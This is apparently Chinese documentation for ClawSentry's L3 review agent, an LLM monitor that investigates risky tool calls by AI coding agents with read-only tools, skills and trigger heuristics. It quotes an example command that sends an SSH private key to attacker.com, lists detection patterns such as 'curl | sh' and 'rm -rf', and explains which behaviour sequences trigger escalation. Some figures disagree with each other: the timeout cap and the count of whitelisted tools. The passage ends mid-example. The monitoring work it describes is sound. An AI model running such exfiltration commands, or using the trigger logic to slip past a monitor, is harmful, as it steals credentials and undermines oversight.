---
title: L3 审查 Agent
description: 自主审查代理 — 多轮工具调用、YAML Skills、推理轨迹、安全约束
---

!!! abstract "本页快速导航"
    [概述](#overview) · [AgentAnalyzer](#agent-analyzer) · [运行态字段](#operator-telemetry) · [ReadOnlyToolkit](#toolkit) · [SkillRegistry](#skill-registry) · [推理轨迹](#trace) · [触发条件](#trigger-policy) · [配置](#configuration) · [代码位置](#source-code)

# L3 审查 Agent

## 概述 {#overview}

L3 是 ClawSentry 三层决策模型的**最高层**，部署一个拥有只读工具的 AI 审查代理 (Review Agent)，对高风险事件进行**深度自主调查**。与 L2 的单轮 LLM 调用不同，L3 可以进行多轮推理，主动调用工具收集证据，最终给出详细的安全评估。

!!! info "设计哲学"
    L1 看模式，L2 看语义，L3 **看上下文**。L3 不仅分析当前事件本身，还会主动查阅源代码、git 历史、文件系统结构和会话轨迹，在完整上下文中做出判断。

!!! note "当前实现边界"
    本页描述同步判决路径中的 L3 审查 Agent。L3 会在高风险或显式触发时读取有界上下文，并用只读工具做深度审查；需要 operator 手动复盘的 full-review / snapshot / job / review 流程见 [L3 咨询审查](l3-advisory.md)。

!!! note "当前可观测字段"
    L3 的运行态不会只藏在 trace 里。`l3_state`、`l3_reason_code`、`trigger_detail`、compact `evidence_summary`、`budget_exhaustion_event` 和 `decision_path_io` 会出现在 `clawsentry watch`、Dashboard Runtime Feed、Session Detail、`/report/sessions`、`/report/session/{id}`、`/report/session/{id}/risk` 等路径中。

<div class="cs-operator-path" markdown>

**30 秒 operator 合同：**

- **什么时候运行：** HIGH+ 风险、累积风险阈值、显式 trigger 或 bounded suspicious sequence。
- **读什么输入：** 当前 CanonicalEvent、L1/L2 RiskSnapshot、session trajectory、只读工具采集的有限上下文。
- **产出什么：** 一个只升不降的 L2Result/RiskSnapshot 补充、`l3_state` / reason / evidence telemetry、可持久化 trace。
- **改变什么：** 同步判决路径可以把风险升级为更严格 verdict；只读工具不会改 workspace。
- **不改变什么：** 它不是 L3 advisory full-review；不会重写历史 canonical decision。复盘报告见 [L3 咨询审查](l3-advisory.md)。

</div>

## L1 / L2 / L3 / Advisory 对比 {#layer-contrast}

| 层级 | 主要问题 | 是否同步影响判决 | 典型输入 | 典型输出 | 在哪里看 |
|------|----------|------------------|----------|----------|----------|
| L1 规则 | 这个工具调用是否命中已知危险模式？ | 是 | event payload、tool name、policy preset | RiskSnapshot、allow/block/defer | `clawsentry watch`、Dashboard、API |
| L2 语义 | 这段文本/命令的语义是否比规则更危险？ | 是，只升不降 | L1 snapshot、event text、可选 LLM / analyzer | `L2Result` 合并到 RiskSnapshot | L2 trace、decision reasons、risk dimensions |
| 同步 L3 Agent | 需要结合上下文、轨迹和只读证据再判断吗？ | 是，只升不降；失败按降级策略返回 | session trajectory、read-only toolkit、review skill、LLM provider | L3 `L2Result`、trace、evidence summary、budget telemetry | Runtime Feed、Session Detail、reporting API |
| L3 Advisory | 高风险 session 需要只读复盘报告吗？ | 否；固定 `advisory_only=true` | frozen snapshot、bounded records、runner | snapshot/job/review、operator next steps | Session Detail full-review、SSE、`clawsentry l3` |

**核心特性：**

| 特性 | 描述 |
|------|------|
| 延迟 | < 30s (多轮工具调用 + LLM 推理) |
| 触发条件 | HIGH+ 风险 / 累积风险阈值 / 显式触发 / bounded suspicious sequences |
| 调用比例 | 约 5% 的事件到达 L3 |
| 模式 | MVP 单轮 / 标准多轮 |
| 工具集 | 7 个只读工具 (ReadOnlyToolkit) |
| 审查技能 | 6 个内置 YAML Skills + 自定义扩展 |
| 审计 | 完整推理轨迹持久化到 TrajectoryStore |

```mermaid
graph TD
    E[CanonicalEvent] --> TP{L3TriggerPolicy<br/>是否触发?}
    TP -->|否| SKIP[跳过 L3, 使用 L1/L2 结果]
    TP -->|是| SR[SkillRegistry<br/>选择审查技能]
    SR --> CTX[收集上下文<br/>会话轨迹 + 事件详情]
    CTX --> MODE{运行模式?}

    MODE -->|单轮 MVP| ST[单次 LLM 调用<br/>直接给出判决]
    MODE -->|标准多轮| MT[多轮循环]

    MT --> LLM[LLM 推理]
    LLM --> TC{工具调用?}
    TC -->|是| TOOL[执行只读工具]
    TOOL --> LLM
    TC -->|否 / done| FIN[最终判决]

    ST --> FIN
    FIN --> TRACE[保存推理轨迹]
    TRACE --> RES[L2Result]
```

---

## Operator 速读：同步 L3 与咨询 L3 的区别 {#operator-summary}

| 能力 | L2 语义分析 | 同步 L3 审查 Agent（本页） | L3 咨询审查 |
|---|---|---|---|
| 主要问题 | “这条命令语义上危险吗？” | “这个高风险事件结合上下文后应该如何判定？” | “这个高风险 session 事后到底发生了什么？” |
| 触发时机 | L1 medium+ 或关键词命中 | high/critical、累计风险、显式触发、可疑序列 | Web UI / CLI / API 手动或排队触发 |
| 延迟/预算 | 通常秒级以内，消耗 L2 budget | 秒级到几十秒，消耗 L3 budget | 异步/有界执行；不阻塞历史事件 |
| 输入 | 当前事件 + L1 snapshot | 当前事件、会话轨迹、只读上下文工具 | 固定证据快照、session timeline、review job |
| 输出 | target risk、reasons、confidence | trace、evidence summary、L2Result 兼容输出 | advisory report、action summary、建议 inspect/escalate/pause |
| 是否改变判决 | 只升不降，可影响当前事件 | 可影响当前同步判决 | 不改写 canonical allow/block/defer |

<div class="cs-flow" markdown>

**推荐启用顺序：** 先用 L1 跑通 Gateway/Web UI → 开启 L2 + token budget → 只在高敏仓库或严格模式启用同步 L3 → 用 L3 咨询审查复盘已经发生的高风险 session。

</div>

---

## AgentAnalyzer {#agent-analyzer}

`AgentAnalyzer` 是 L3 的核心类，实现了与 `SemanticAnalyzer` 兼容的接口（返回 `L2Result`），使其可以作为 `CompositeAnalyzer` 的子分析器无缝集成。

```python
class AgentAnalyzer:
    def __init__(
        self,
        provider: LLMProvider,              # LLM 后端
        toolkit: ReadOnlyToolkit,            # 只读工具集
        skill_registry: SkillRegistry,       # 审查技能注册表
        trigger_policy: L3TriggerPolicy,     # 触发策略 (可选)
        config: AgentAnalyzerConfig,         # 配置 (可选)
    ):
        ...

    @property
    def analyzer_id(self) -> str:
        return "agent-reviewer"

    async def analyze(
        self, event, context, l1_snapshot, budget_ms
    ) -> L2Result:
        """L3 入口：触发检查 → 技能选择 → 单轮/多轮分析 → 返回结果。"""
        ...
```

### 配置参数

```python
@dataclass
class AgentAnalyzerConfig:
    provider_timeout_ms: float = 120_000.0  # 单次 LLM 调用超时
    hard_cap_ms: float = 120_000.0          # L3 总耗时硬上限
    l3_budget_ms: Optional[float] = None    # 独立 L3 预算；None=沿用外部 budget
    max_reasoning_turns: int = 8            # 多轮模式最大推理轮数
    initial_trajectory_limit: int = 20      # 初始轨迹回放条数
    max_findings: int = 10                  # 最终 findings 列表最大条数
    enable_multi_turn: bool = False         # 裸配置默认单轮；工厂可覆盖为多轮
```

!!! warning "Hard Cap 保证"
    `hard_cap_ms=30000` 是不可突破的硬上限。无论 LLM 是否仍在推理、工具是否仍在执行，L3 在 30 秒后必定返回结果（必要时降级）。

---

## 运行模式 {#modes}

### MVP 单轮模式 {#single-turn}

当 `enable_multi_turn=False` 时，L3 执行单轮分析：

1. 选择最匹配的审查技能
2. 读取会话轨迹（最近 20 条事件）
3. 构建包含事件详情 + 轨迹摘要 + 技能约束的 Prompt
4. 单次 LLM 调用，直接获取最终判决

```mermaid
sequenceDiagram
    participant AA as AgentAnalyzer
    participant SR as SkillRegistry
    participant TK as ReadOnlyToolkit
    participant LLM as LLM Provider

    AA->>SR: select_skill(event, risk_hints)
    SR-->>AA: ReviewSkill (e.g. shell-audit)
    AA->>TK: read_trajectory(session_id, limit=20)
    TK-->>AA: trajectory_summary
    AA->>LLM: complete(system_prompt, structured_prompt)
    LLM-->>AA: {"risk_level": "high", "findings": [...], "confidence": 0.9}
    AA->>AA: parse + enforce upgrade-only
    AA-->>AA: L2Result + trace
```

### 标准多轮模式 {#multi-turn}

当 `enable_multi_turn=True` 时，L3 进入多轮推理循环，LLM 可以主动调用工具收集更多证据。

!!! tip "运行时默认值"
    直接实例化 `AgentAnalyzerConfig()` 时，`enable_multi_turn` 的裸默认值仍是 `False`。但通过 `build_analyzer_from_env()` 启用 L3 时，默认运行模式是 `multi_turn`；只有显式设置 `CS_L3_MULTI_TURN=false` 才会退回单轮 MVP。

**每轮 LLM 响应的两种格式：**

=== "工具调用请求"

    ```json
    {
      "thought": "需要检查这个文件的内容来判断是否有凭证泄露",
      "tool_call": {
        "name": "read_file",
        "arguments": {"relative_path": "config/secrets.yaml"}
      },
      "done": false
    }
    ```

=== "最终判决"

    ```json
    {
      "risk_level": "high",
      "findings": [
        "config/secrets.yaml 包含明文 API 密钥",
        "该文件在最近 3 次提交中被修改",
        "Agent 尝试读取后又执行了 curl 命令"
      ],
      "confidence": 0.92
    }
    ```

**多轮循环的约束：**

| 约束 | 值 | 超出后行为 |
|------|:--:|------------|
| 最大推理轮数 | 8 | 降级为 L1 结果 |
| 总耗时硬上限 | 30s | 降级为 L1 结果 |
| 工具调用预算 | 20 次 | 抛出 `ToolCallBudgetExhausted` |
| 允许的工具列表 | 5 个白名单工具 | 请求未知工具 → 降级 |

```python
# 工具调用白名单
_ALLOWED_TOOL_CALLS = {
    "read_trajectory": "read_trajectory",
    "read_file": "read_file",
    "read_transcript": "read_transcript",
    "read_session_risk": "read_session_risk",
    "search_codebase": "search_codebase",
    "query_git_diff": "query_git_diff",
    "list_directory": "list_directory",
}
```

```mermaid
sequenceDiagram
    participant AA as AgentAnalyzer
    participant LLM as LLM Provider
    participant TK as ReadOnlyToolkit

    loop 最多 8 轮
        AA->>LLM: complete(system_prompt, messages)
        alt 工具调用
            LLM-->>AA: {thought, tool_call, done: false}
            AA->>AA: 验证工具名在白名单
            AA->>TK: execute_tool(name, args)
            TK-->>AA: tool_result
            AA->>AA: 追加到 messages
        else 最终判决
            LLM-->>AA: {risk_level, findings, confidence}
            AA->>AA: parse + enforce upgrade-only
            AA-->>AA: 返回 L2Result
        end
    end
    Note over AA: 超出轮数 → 降级
```

---

## 运行态与可观测字段 {#operator-telemetry}

这些字段用于让 operator 快速判断 L3 是否运行、为什么跳过或降级，以及保留了哪些关键证据。

### 顶层运行态

L3 相关响应会优先暴露以下顶层字段：

| 字段 | 作用 |
|------|------|
| `l3_state` | `enabled / not_triggered / running / completed / degraded` 等运行态 |
| `l3_reason_code` | 为什么进入、跳过或降级 L3 |
| `trigger_reason` | 稳定的大类触发原因 |
| `trigger_detail` | `secret_plus_network` 之类更细的 bounded suspicious sequence 细节 |

### 触发增强选项

L3 提供一组显式 opt-in 的触发增强：

- `l3_routing_mode=replace_l2`：当请求满足 organic L2 入口条件时，直接用本地 L3 替换 L2。
- `l3_trigger_profile=eager`：保持正常 routing，但让正常模式更容易升级到 L3。
- `l3_budget_tuning_enabled=true`：只在显式开启时允许模式感知的更大默认预算；显式 env / 项目 `l3_budget_ms` 覆盖仍优先。

这些能力都是**显式 opt-in**。默认配置下，L3 触发和预算行为保持原状。

### 本地 L3 不可用时的诚实遥测

如果项目或环境配置请求 `replace_l2` / `eager`，但网关启动时没有本地 L3 能力，则这些增强能力对该 runtime 视为 unsupported：

- 路由不会假装已经执行 L3
- 系统继续运行真实可用的回退层级（L1 或 L2）
- 运行态字段必须诚实表达意图与实际执行结果：

| 字段 | 值 |
|------|----|
| `l3_available` | `false` |
| `effective_tier` | `L3` |
| `actual_tier` | 实际执行的真实 tier |
| `l3_state` | `skipped` |
| `l3_reason_code` | `local_l3_unavailable` |

### 证据与预算读数

| 字段 | 作用 |
|------|------|
| `evidence_summary` | 供 operator 快速阅读的紧凑 retained-evidence 摘要 |
| `budget_exhaustion_event` | 预算耗尽时保留下来的明确子事件 |
| `decision_path_io` | 当前同步决策路径的 I/O 读数，帮助判断 record/report 路径压力 |

### 这些字段会出现在哪里？

- `clawsentry watch`
- Dashboard Runtime Feed
- Session Detail replay / risk timeline
- `/report/sessions`
- `/report/session/{id}`
- `/report/session/{id}/risk`
- `clawsentry test-llm`

这些字段的目标不是替代完整 trace，而是给值守人员一个稳定、可扫读的 L3 运行态摘要。

---

## ReadOnlyToolkit — 只读工具集 {#toolkit}

`ReadOnlyToolkit` 是 L3 Agent 可以使用的工具集合。所有工具都严格**只读**，不会产生任何副作用。

```python
class ReadOnlyToolkit:
    MAX_FILE_READ_BYTES = 512_000    # 单文件最大读取 512KB
    MAX_TOOL_CALLS = 20              # 工具调用预算
    MAX_TRAJECTORY_EVENTS = 500      # 轨迹回放上限
    MAX_SESSION_RISK_EVENTS = 200    # session 风险时间线回放上限
```

### 工具列表

| 工具名 | 签名 | 功能 | 安全约束 |
|--------|------|------|----------|
| `read_trajectory` | `(session_id, limit=100)` | 读取会话的历史事件轨迹 | 最多 500 条 |
| `read_file` | `(relative_path)` | 读取工作空间内的文件内容 | 路径沙箱 + 512KB 截断 |
| `read_transcript` | `()` | 读取当前 analysis session 绑定的 transcript | transcript 路径必须仍在 `workspace_root` 内 |
| `read_session_risk` | `(limit=50)` | 读取当前 session 的风险时间线/汇总 | 仅当前 session，最多 200 条 |
| `search_codebase` | `(pattern, glob="**/*", max_results=50)` | 正则搜索代码库 | 最多 50 条结果 |
| `query_git_diff` | `(ref="HEAD")` | 查看 git diff | ref 格式校验 + 10s 超时 |
| `list_directory` | `(relative_path=".")` | 列出目录内容 | 路径沙箱 |

### 安全设计

!!! danger "路径沙箱 (Path Sandboxing)"
    所有涉及文件路径的工具都通过 `_safe_path()` 方法进行沙箱检查：

    ```python
    def _safe_path(self, relative_path: str) -> Path:
        clean = relative_path.lstrip("/")
        target = (self._workspace_root / clean).resolve()
        try:
            target.relative_to(self._workspace_root)
        except ValueError:
            raise ValueError(f"Path '{relative_path}' escapes workspace_root")
        return target
    ```

    - 所有路径必须在 `workspace_root` 内
    - 禁止 `../` 遍历攻击
    - 绝对路径被自动转为相对路径
    - `read_transcript()` 即使拿到绝对 `transcript_path`，仍要重新验证其位于当前 `workspace_root` 内

**工具调用预算 (Budget)：**

每次工具调用消耗 1 点预算。当预算耗尽（默认 20 次），任何后续调用都会抛出 `ToolCallBudgetExhausted` 异常，导致 L3 分析立即终止并降级。

```python
def _consume_call(self) -> None:
    if self._calls_remaining <= 0:
        raise ToolCallBudgetExhausted(
            f"ReadOnlyToolkit budget exhausted (max {self.MAX_TOOL_CALLS} calls)"
        )
    self._calls_remaining -= 1
```

### 工具详解

=== "read_trajectory"

    读取指定会话的历史事件记录，返回每条事件的时间戳、工具名、事件类型、风险提示和风险等级。

    ```python
    await toolkit.read_trajectory("session-abc-123", limit=20)
    # 返回:
    # [
    #   {"recorded_at": "2026-03-23T10:00:00Z",
    #    "event": {"tool_name": "bash", "event_type": "pre_action", ...},
    #    "decision": {"risk_level": "medium", ...},
    #    "risk_level": "medium"},
    #   ...
    # ]
    ```

=== "read_file"

    读取工作空间内的文件内容。超过 512KB 的文件会被截断并附加提示。

    ```python
    content = await toolkit.read_file("src/config/database.py")
    # 返回文件内容字符串
    # 如果文件不存在: "[error: 'path' is not a file or does not exist]"
    ```

=== "read_transcript"

    读取当前 worker session 已绑定的 transcript。适合让 L3 直接检查最近几轮对话、工具调用上下文或 agent 自述。

    ```python
    content = await toolkit.read_transcript()
    # 返回 transcript 文本
    # 如果 transcript 未绑定: "[error: transcript_path is not bound for this analysis session]"
    ```

=== "read_session_risk"

    读取当前 session 的风险汇总与时间线，用于判断这次风险是否属于持续模式而非孤立事件。

    ```python
    session_risk = await toolkit.read_session_risk(limit=20)
    # 返回:
    # {
    #   "session_id": "session-abc-123",
    #   "current_risk_level": "high",
    #   "cumulative_score": 7,
    #   "risk_timeline": [...]
    # }
    ```

=== "search_codebase"

    在代码库中进行正则搜索，返回匹配的文件路径、行号和内容。

    ```python
    results = await toolkit.search_codebase(
        pattern=r"password\s*=",
        glob="**/*.py",
        max_results=20,
    )
    # 返回:
    # [{"file": "src/auth.py", "line": 42, "content": "password = os.getenv(...)"}]
    ```

=== "query_git_diff"

    执行 `git diff` 查看代码变更。ref 参数经过安全校验，只允许字母数字和常见 git ref 字符。

    ```python
    diff_output = await toolkit.query_git_diff(ref="HEAD~3")
    # 返回 git diff 的完整文本输出
    ```

=== "list_directory"

    列出指定目录下的文件和子目录，目录名以 `/` 结尾。

    ```python
    entries = await toolkit.list_directory("src/clawsentry/gateway")
    # 返回:
    # ["src/clawsentry/gateway/__init__.py",
    #  "src/clawsentry/gateway/models.py",
    #  "src/clawsentry/gateway/skills/",
    #  ...]
    ```

---

## SkillRegistry — 审查技能注册表 {#skill-registry}

`SkillRegistry` 管理 YAML 定义的审查技能 (Review Skills)。每个技能封装了一个特定安全领域的审查 System Prompt 和触发条件。L3 在分析开始时选择最匹配的技能来引导审查方向。

### 技能选择算法

```python
def select_skill(self, event, risk_hints) -> ReviewSkill:
    # 对每个启用的技能计算匹配分:
    #   risk_hints 命中 × 10 分
    #   tool_name 命中 × 5 分
    #   payload_pattern 命中 × 1 分
    # 取最高分技能；同分取最高 priority
    # 无匹配时回退到 general-review
    ...
```

### 内置技能一览 {#built-in-skills}

| 技能名 | 优先级 | 专长 | 关键触发条件 |
|--------|:------:|------|------------|
| `shell-audit` | 10 | Shell 命令安全审查 | `privilege_escalation`, `destructive_intent`, bash/shell 工具 |
| `credential-audit` | 10 | 凭证安全审查 | `credential_exfiltration`, `.ssh/`, `.env`, password |
| `code-review` | 8 | 代码修改审查 | `code_injection`, `supply_chain_attack`, write/edit 工具 |
| `file-system-audit` | 8 | 文件系统操作审查 | `path_traversal`, `/etc/`, `../`, sudoers |
| `network-audit` | 8 | 网络操作审查 | `data_exfiltration`, curl, wget, nc |
| `general-review` | 0 | 通用安全审查 (fallback) | 无特定触发条件，兜底使用 |

### Skill YAML Schema {#skill-schema}

每个技能由一个 YAML 文件定义，存放在 `src/clawsentry/gateway/skills/` 目录下。

```yaml
# 技能名称（唯一标识）
name: shell-audit

# 技能描述（双语）
description: >
  审查 Shell 命令执行，检测命令注入和权限升级 /
  Audit shell command execution for injection and privilege escalation

# 是否启用
enabled: true

# 优先级（同分时高优先级技能胜出）
priority: 10

# 触发条件
triggers:
  risk_hints:                    # 匹配 event.risk_hints (x10 分)
    - privilege_escalation
    - destructive_intent
    - shell_injection
  tool_names:                    # 匹配 event.tool_name (x5 分)
    - bash
    - shell
    - exec
    - sudo
  payload_patterns:              # 子串匹配 event.payload (x1 分)
    - "sudo"
    - "chmod 777"
    - "rm -rf"
    - "curl | sh"

# 审查 System Prompt（双语，引导 LLM 审查方向）
system_prompt: |
  你是一个 Shell 安全审查专家。分析 AI agent 执行的命令，判断是否存在:
  1. 命令注入风险
  2. 权限升级
  3. 破坏性命令
  4. 代码下载并执行
  5. 数据外传

  You are a Shell security auditor. Analyze the AI agent's command for:
  1. Command injection risks
  2. Privilege escalation
  3. Destructive commands
  4. Download-and-execute patterns
  5. Data exfiltration

  Respond ONLY with JSON:
  {"risk_level": "low|medium|high|critical",
   "findings": ["..."], "confidence": 0.0}

# 评估标准（用于 Prompt 上下文）
evaluation_criteria:
  - name: command_injection
    severity: critical
    description: 命令注入风险 / Command injection risk
  - name: privilege_escalation
    severity: critical
    description: 权限升级 / Privilege escalation
  - name: destructive_command
    severity: high
    description: 破坏性命令 / Destructive command execution
```

### 自定义技能 {#custom-skills}

通过 `AHP_SKILLS_DIR` 环境变量指定额外的技能目录，ClawSentry 会在启动时自动加载该目录下的所有 `.yaml` 文件。

```bash
# 创建自定义技能目录
mkdir -p /etc/clawsentry/skills

# 编写自定义技能
cat > /etc/clawsentry/skills/docker-audit.yaml << 'EOF'
name: docker-audit
description: 审查 Docker 容器操作
enabled: true
priority: 9
triggers:
  risk_hints:
    - container_escape
  tool_names:
    - bash
    - exec
  payload_patterns:
    - docker
    - container
    - "--privileged"
    - "--cap-add"
system_prompt: |
  你是一个容器安全审查专家...
  Respond ONLY with JSON: {"risk_level": "...", "findings": [...], "confidence": 0.0}
evaluation_criteria:
  - name: container_escape
    severity: critical
    description: 容器逃逸风险
  - name: privileged_container
    severity: high
    description: 特权容器使用
EOF

# 启动时指定自定义技能目录
export AHP_SKILLS_DIR=/etc/clawsentry/skills
clawsentry gateway
```

!!! note "技能名称冲突处理"
    自定义技能通过 `load_additional()` 加载。如果自定义技能的 `name` 与内置技能重复，该自定义技能会被跳过并记录警告日志。内置技能不可被覆盖。

---

## L3 推理轨迹 (Trace) {#trace}

L3 的完整推理过程会被记录为结构化的轨迹数据 (trace)，持久化到 `TrajectoryStore` 的 `l3_trace_json` 列中。这为安全审计和事后分析提供了完整的决策可重构性。

### 轨迹结构

```python
trace = {
    "trigger_reason": "manual_l3_escalate",  # 触发原因
    "skill_selected": "shell-audit",     # 选择的审查技能
    "mode": "multi_turn",                # 运行模式
    "turns": [                           # 每轮交互记录
        {
            "turn": 1,
            "type": "llm_call",
            "prompt_length": 2048,
            "response_raw": "{...}",     # LLM 原始响应
            "latency_ms": 1200.5,
        },
        {
            "turn": 2,
            "type": "tool_call",
            "tool_name": "read_file",
            "tool_args": {"relative_path": "config/db.py"},
            "tool_result_length": 4096,
            "latency_ms": 15.2,
        },
        {
            "turn": 3,
            "type": "llm_call",
            "prompt_length": 6200,
            "response_raw": "{...}",
            "latency_ms": 1800.3,
        },
    ],
    "final_verdict": {                   # 最终判决
        "risk_level": "high",
        "findings": [
            "config/db.py 包含硬编码数据库密码",
            "Agent 在读取密码后尝试执行 curl 命令",
        ],
        "confidence": 0.92,
    },
    "total_latency_ms": 3100.5,          # 总耗时
    "tool_calls_used": 1,               # 工具调用次数
    "degraded": false,                   # 是否降级
    "degradation_reason": null,          # 降级原因
}
```

!!! abstract "审计完整性"
    轨迹数据包含 LLM 的原始响应 (`response_raw`)、工具调用参数和结果长度、每轮延迟，以及最终判决的完整结构。安全审计人员可以完整重构 L3 Agent 的推理过程，验证判决的合理性。

### 降级轨迹

当 L3 发生降级时，轨迹中会记录降级原因：

```python
trace = {
    "trigger_reason": "cumulative_risk",
    "skill_selected": "shell-audit",
    "mode": "multi_turn",
    "turns": [...],                      # 可能只有部分轮次
    "final_verdict": None,               # 无最终判决
    "total_latency_ms": 30001.2,
    "tool_calls_used": 5,
    "degraded": True,                    # 标记降级
    "degradation_reason": "L3 hard cap exceeded",
}
```

---

## L3 决策原则 {#principles}

### 只升不降 {#upgrade-only}

与 L2 相同，L3 **永远不能将风险等级降低到 L1/L2 评估之下**：

```python
target_level = _max_risk_level(risk_level, l1_snapshot.risk_level)
```

### 故障安全 (Fail-Safe) {#fail-safe}

L3 的任何故障都会导致降级，降级后 confidence 设为 0.0：

| 故障场景 | 行为 |
|----------|------|
| L3 触发条件不满足 | 返回 L1 结果, confidence=0.0 |
| LLM 调用超时/异常 | 返回 L1 结果, confidence=0.0 |
| LLM 响应解析失败 | 返回 L1 结果, confidence=0.0 |
| 推理轮数超限 (>8) | 返回 L1 结果, confidence=0.0 |
| 总耗时超限 (>30s) | 返回 L1 结果, confidence=0.0 |
| 请求非白名单工具 | 返回 L1 结果, confidence=0.0 |
| 工具调用预算耗尽 | 异常传播 → 外层捕获降级 |

!!! danger "L3 永不降级原始风险等级"
    这里的"降级"指的是 L3 分析流程本身的降级（回退到 L1 结果），而非风险等级的降低。即使 L3 降级，风险等级也保持 L1 的原始评估，不会更低。

---

## L3 触发条件 {#trigger-policy}

`L3TriggerPolicy` 是一个独立的确定性策略类，决定哪些事件需要升级到 L3 深度审查。

```python
class L3TriggerPolicy:
    def trigger_reason(
        self, event, context, l1_snapshot, session_risk_history
    ) -> str | None:
        if self._has_manual_flag(context):          return "manual_l3_escalate"
        if self._detect_suspicious_pattern(...):    return "suspicious_pattern"
        if self._cumulative_risk_score(...) >= 5:   return "cumulative_risk"
        if self._is_high_risk_tool(event) and \
           self._payload_complexity(event.payload): return "high_risk_complex_payload"
        return None
```

### 触发条件详解

| 条件 | 判断逻辑 | 触发原因 | Operator 解读 |
|------|----------|----------|---------------|
| **手动触发标志** | `DecisionContext` 含 `l3_escalate`/`force_l3`/`manual_l3_escalation` | `manual_l3_escalate` | 上游系统或人工明确要求同步深审。 |
| **可疑行为序列** | 当前事件 + 最近会话历史命中有界序列启发式 | `suspicious_pattern` | 例如凭证访问后接网络外传、侦察后接 sudo，单点事件不足以说明全链路。 |
| **累积风险分** | 会话历史风险分总和 + 当前事件风险分 >= 5 | `cumulative_risk` | 多个 medium/high 事件叠加到需要上下文判断的 session 风险。 |
| **高危工具 + 复杂 payload** | 工具为 bash/shell/exec/write 等 **且** payload 满足复杂条件 | `high_risk_complex_payload` | 高危工具携带复杂参数，规则层难以解释全部语义。 |

当前 `suspicious_pattern` 先覆盖两类确定性序列：

- 凭证/敏感访问后又出现网络/外传行为
- 递进式权限升级链：`read -> write -> exec -> sudo`

这仍然是有界的 trigger heuristic，不是新的 L3 调度器，也不是完整的行为建模层。

!!! note "未触发时的轨迹"
    当 L3 未被触发时，`AgentAnalyzer` 会返回降级结果并记录 `trigger_reason="trigger_not_matched"`。这使得 Gateway/报表/CLI probe 可以区分“L3 未触发”和“L3 已触发但后续降级”两类情况。

### Payload 复杂度判定

当事件使用高危工具时，还需检查 payload 是否足够复杂以值得 L3 深入分析：

```python
def _payload_complexity(self, payload) -> bool:
    serialized = json.dumps(payload)
    if len(serialized) >= 512:          return True   # 序列化长度 >= 512
    if self._max_depth(payload) >= 3:   return True   # 嵌套深度 >= 3
    if len(payload) >= 6:               return True   # 顶层键数 >= 6
    return False
```

| 条件 | 阈值 | 含义 |
|------|:----:|------|
| 序列化长度 | >= 512 字节 | 长命令或复杂参数 |
| 嵌套深度 | >= 3 层 | 结构化的复杂操作 |
| 顶层键数 | >= 6 个 | 多参数操作 |

---

## 配置 {#configuration}

| 环境变量 | 说明 | 默认值 |
|----------|------|:------:|
| `CS_L3_ENABLED` | 启用 L3 审查 Agent | `false` |
| `CS_L3_MULTI_TURN` | 运行模式开关；`false` 强制单轮 | `true`（L3 启用时） |
| `CS_L3_ADVISORY_ASYNC_ENABLED` | 在 high/critical decision 或 high+ trajectory alert 后自动创建 frozen advisory snapshot；当前不启动真实 review scheduler | `false` |
| `CS_L3_HEARTBEAT_REVIEW_ENABLED` | 预留 heartbeat/idle 聚合后的 advisory snapshot review 开关；不启用 timer-only full review | `false` |
| `CS_L3_ADVISORY_RUN_REAL_SMOKE` | 测试套件里的真实 provider readiness gate；未显式启用时真实网络调用默认跳过 | `false` |
| `CS_L3_ADVISORY_SMOKE_STRIP_PROXY_ENV` | 手动 readiness check 默认剥离 proxy 环境变量，避免 SOCKS proxy 缺依赖污染 provider client | `true` |
| `CS_LLM_PROVIDER` | LLM 提供商 (L3 必须) | — |
| `ANTHROPIC_API_KEY` / `OPENAI_API_KEY` | 对应 Provider 的 API 密钥 | — |
| `CS_LLM_MODEL` | 覆盖模型名称 | 按 Provider 默认 |
| `CS_LLM_BASE_URL` | OpenAI 兼容端点 | — |
| `AHP_SKILLS_DIR` | 自定义技能 YAML 目录 | 空 (仅内置技能) |

### 启用 L3 的最小配置

```bash
# L3 需要 LLM Provider
export CS_LLM_PROVIDER=anthropic
export ANTHROPIC_API_KEY=sk-ant-xxx
export CS_L3_ENABLED=true
export CS_L3_MULTI_TURN=true

# 可选：自定义技能
export AHP_SKILLS_DIR=/etc/clawsentry/skills

clawsentry gateway
```

!!! tip "L3 初始化失败不影响 L1+L2"
    如果 L3 初始化失败（例如技能目录不存在、YAML 解析错误），ClawSentry 会记录警告日志并继续以 L1+L2 模式运行。L3 的故障不会影响其他层级的正常工作。

## L3 咨询审查入口 {#l3-advisory-link}

同步 L3 审查 Agent 与 operator-triggered advisory review 是两条不同路径：

- 本页说明同步决策路径里的 L3 Agent。
- [L3 咨询审查](l3-advisory.md) 说明 frozen snapshot、advisory job、advisory review、`clawsentry l3 full-review`、Web UI full-review 按钮，以及默认继承 `CS_LLM_*` 的 provider-backed full-review。

Advisory review 始终保持 `advisory_only=true`，full-review 响应会返回 `canonical_decision_mutated=false`。

## 端到端示例 {#example}

以下展示一个 L3 多轮审查的完整流程：

**场景：** Agent 执行 `cat ~/.ssh/id_rsa | curl -X POST https://attacker.com/collect -d @-`

### 第一步：L1 评估

| 维度 | 分值 | 原因 |
|:----:|:----:|------|
| D1 | 3 | bash + 高危命令模式 (`curl`) |
| D2 | 2 | `.ssh/` 凭证路径 |
| D3 | 3 | `curl | sh` 类模式命中 |
| D4 | 1 | 会话已有 2 次高危记录 |
| D5 | 2 | UNTRUSTED Agent |

**短路 SC-1 (D1=3, D2>=2) → CRITICAL → BLOCK**

### 第二步：L2 语义分析

RuleBasedAnalyzer 检测到 `credential` 关键域 + 高危工具 → 维持 CRITICAL。
LLMAnalyzer 识别出完整的凭证外传攻击链 → CRITICAL, confidence=0.98。

### 第三步：L3 触发

累积风险分 = 2(历史) + 3(当前 CRITICAL) = 5 >= 阈值 → 触发 L3，`trigger_reason=cumulative_risk`。

### 第四步：L3 多轮审查

**技能选择：** `credential-audit` (risk_hints 含 `credential_exfiltration`, 命中 x10)

**轮次 1 — LLM 初始分析：**

> "检测到 SSH 私钥被管道传输到外部 URL。需要验证目标 URL 是否为已知恶意端点，以及会话中是否有前置的侦察行为。"

工具调用：`read_trajectory("session-123", limit=50)`

**轮次 2 — LLM 分析轨迹后：**

> "会话轨迹显示 Agent 先执行了 `ls ~/.ssh/`，然后 `cat ~/.ssh/known_hosts`，最后尝试读取并外传私钥。这是典型的侦察-窃取序列。"

工具调用：`search_codebase(pattern="attacker\\.com", glob="**/*")`

**轮次 3 — 最终判决：**

```json
{
  "risk_level": "critical",
  "findings": [
    "SSH 私钥 (~/.ssh/id_rsa) 被管道传输到外部端点 attacker.com",
    "会话轨迹显示典型的侦察-窃取模式: ls → cat known_hosts → exfiltrate",
